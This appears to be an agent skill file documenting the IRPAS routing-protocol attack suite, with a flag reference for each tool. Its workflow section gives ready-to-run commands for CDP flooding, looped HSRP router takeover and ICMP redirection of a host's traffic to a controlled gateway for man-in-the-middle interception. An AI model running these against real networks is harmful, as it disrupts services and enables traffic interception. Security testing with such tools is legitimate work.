---
name: irpas
description: Internetwork Routing Protocol Attack Suite (IRPAS) is a collection of tools for advanced network operations, protocol manipulation, and security testing. It includes tools for attacking or testing CDP, IGRP, HSRP, IRDP, and ICMP, as well as specialized traceroute and scanning utilities. Use this suite for network reconnaissance, routing protocol exploitation, man-in-the-middle attacks via ICMP redirection, and firewall testing.
---

# irpas

## Overview
IRPAS is a comprehensive suite of tools designed for network protocol testing and exploitation. It covers various layers of the OSI model, focusing heavily on routing protocols (IGRP, IRDP, HSRP) and network management protocols (CDP). Category: Reconnaissance / Information Gathering / Exploitation.

## Installation (if not already installed)
Assume the suite is installed. If commands are missing:
```bash
sudo apt update
sudo apt install irpas
```

## Common Workflows

### Cisco Discovery Protocol (CDP) Flooding
Flood a network with random CDP neighbor information to overwhelm Cisco devices or monitoring systems.
```bash
cdp -i eth0 -m 0 -n 100 -r
```

### HSRP Takeover Loop
Continuously send HSRP hello packets to attempt to become the active router in a Hot Standby Router Protocol group.
```bash
while true; do
  hsrp -d 224.0.0.2 -v 192.168.1.22 -a cisco -g 1 -i eth0
  sleep 3
done
```

### TCP SYN Traceroute
Perform a traceroute using TCP SYN packets to bypass firewalls that block standard ICMP/UDP traceroutes.
```bash
tctrace -i eth0 -d 8.8.8.8 -D 443
```

### ICMP Redirection
Redirect traffic from a specific source to a gateway you control.
```bash
icmp_redirect -i eth0 -s 192.168.1.50/32 -d 0.0.0.0/0 -G 192.168.1.100
```

## Complete Command Reference

### ass (Autonomous System Scanner)
```bash
ass [-v[v[v]]] -i <interface> [-ApcMs] [-P IER12] [-a <start>] [-b <stop>] [-S <spoof_ip>] [-D <dest_ip>] [-T <packets_per_delay>] [-r <filename>]
```
| Flag | Description |
|------|-------------|
| `-v` | Verbosity level (can be repeated) |
| `-i` | Network interface |
| `-a` | Autonomous system start range |
| `-b` | Autonomous system stop range |
| `-S` | Spoofed source IP |
| `-D` | Destination IP |
| `-T` | Packets per delay |
| `-r` | Output filename |

### cdp (Cisco Discovery Protocol)
```bash
cdp [-v] -i <interface> -m {0,1} [options]
```
**Flood mode (`-m 0`):**
| Flag | Description |
|------|-------------|
| `-n` | Number of packets |
| `-l` | Length of the device ID |
| `-c` | Character to fill in device ID |
| `-r` | Randomize device ID string |

**Spoof mode (`-m 1`):**
| Flag | Description |
|------|-------------|
| `-D` | Device ID string |
| `-P` | Port ID string |
| `-L` | Platform string |
| `-S` | Software string |
| `-F` | IP address |
| `-C` | Capabilities (R: Router, T: Trans Bridge, B: Source Route Bridge, S: Switch, H: Host, I: IGMP, r: Repeater) |

### dhcpx (DHCP Exerciser)
```bash
dhcpx [-v[v[v]]] -i <interface> [-A] [-D <dest_ip>] [-t <discovery_time>] [-u <arp_time>]
```

### file2cable (Raw Ethernet Dump)
```bash
file2cable [-v] -i <interface> -f <file>
```

### hsrp (HSRP Failover Tester)
```bash
hsrp -i <interface> -v <virtual_IP> -d <router_ip> -a <authword> -g <group> [-S <source>]
```

### icmp_redirect
```bash
icmp_redirect [-v[v[v]]] -i <interface> [-s <src_net/mask>] [-d <dst_net/mask>] [-G <gateway_IP>] [-w <delay>] [-S <ip>]
```

### igrp (IGRP Route Injector)
```bash
igrp [-v[v[v]]] -i <interface> -f <routes_file> -a <AS> [-b brute_end] [-S <spoof_ip>] [-D <dest_ip>]
```

### inetmask (ICMP Netmask Request)
```bash
inetmask -d <destination> -t <timeout>
```

### irdp / irdpresponder (ICMP Router Discovery Protocol)
```bash
irdp [-v] -i <interface> [-S <spoof_ip>] [-D <dest_ip>] [-l <lifetime>] [-p <preference>]
```

### itrace (ICMP Traceroute)
```bash
itrace [-vn] [-pX] [-mX] [-tX] -i<dev> -d<destination>
```
| Flag | Description |
|------|-------------|
| `-v` | Verbose |
| `-n` | Do not reverse lookup IPs |
| `-p` | Number of probes (default 3) |
| `-m` | Maximum TTL (default 30) |
| `-t` | Timeout in seconds (default 3) |

### protos (IP Protocol Scanner)
```bash
protos -i <interface> -d <destination> [options]
```
| Flag | Description |
|------|-------------|
| `-v` | Verbose |
| `-V` | Show unsupported protocols |
| `-u` | Don't ping targets first |
| `-s` | Slow scan for remote devices |
| `-L` | Show long protocol name and RFC reference |
| `-p` | Number of probes (default 5) |
| `-S` | Sleep time (default 1) |
| `-a` | Continue scan for X seconds (default 3) |
| `-W` | Don't scan, just print protocol list |

### tctrace (TCP SYN Traceroute)
```bash
tctrace [-vn] [-pX] [-mX] [-tX] [-DX] [-SX] -i<dev> -d<destination>
```
| Flag | Description |
|------|-------------|
| `-D` | Destination port (default 80) |
| `-S` | Source port (default 1064) |

### timestamp (ICMP Timestamp Request)
```bash
timestamp -d <destination> -t <timeout>
```

## Notes
- **Safety**: These tools generate raw network traffic and can disrupt production networks, especially `cdp` flooding and `hsrp` injection.
- **dfkaa**: This tool (Devices Formerly Known As Ascend) lacks a standard help menu; usage requires source code inspection.
- **netenum**: Primarily used for ping scanning within shell scripts.